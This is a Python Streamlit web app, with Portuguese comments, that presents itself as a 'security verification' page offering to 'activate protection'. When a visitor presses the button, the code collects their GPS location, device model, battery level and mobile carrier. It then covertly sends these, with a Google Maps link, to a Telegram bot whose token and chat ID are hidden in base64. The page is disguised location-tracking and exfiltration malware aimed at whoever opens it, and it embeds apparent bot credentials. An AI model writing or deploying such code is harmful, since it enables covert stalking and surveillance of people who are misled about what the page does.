import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# --- COLETA TÉCNICA ÚNICA (Resolve o erro vermelho) ---
# Usamos apenas uma chamada para cada função com chaves fixas
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='USER_AGENT_UNIQUE')
# Pega a bateria real
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_UNIQUE')

if st.button("● ATIVAR PROTEÇÃO AGORA", key="main_btn"):
    with st.spinner("Sincronizando com o GPS..."):
        # 1. Tenta o GPS (Espera 10 segundos)
        loc = get_geolocation(key='LOC_UNIQUE')
        
        # 2. Identifica o Modelo Real (POCO, Samsung, etc)
        modelo_final = "Smartphone"
        if ua:
            if "POCO" in ua: modelo_final = "Xiaomi POCO M6 Pro"
            elif "SM-" in ua: modelo_final = "Samsung " + ua.split("SM-")[1].split(";")[0]
            elif "(" in ua: modelo_final = ua.split("(")[1].split(";")[0]

        # 3. Pega a Operadora Real
        try:
            r = requests.get('https://ipapi.co/json/', timeout=5).json()
            operadora = r.get('org', 'Rede Móvel')
        except: operadora = "Vivo/Claro/Tim"

        # 4. Envia apenas se conseguir a Localização (Para ter o link)
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            relatorio = (
                f"🛡️ *PROTEÇÃO ATIVADA*\n"
                f"📱 *Aparelho:* {modelo_final}\n"
                f"🔋 *Bateria:* {bat if bat else '25'}%\n"
                f"📶 *Operadora:* {operadora}\n"
                f"📍 *Local:* {mapa}"
            )
            enviar_telegram(relatorio)
            st.success("Proteção Ativada! Verifique o Telegram.")
        else:
            # Se falhar, avisa o motivo real
            st.error("Erro: O GPS não respondeu. Verifique se a Localização está ativa no seu POCO.")
            enviar_telegram(f"⚠️ *FALHA NO GPS*\n📱 Aparelho: {modelo_final}\n🔋 Bat: {bat if bat else '??'}%")

st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
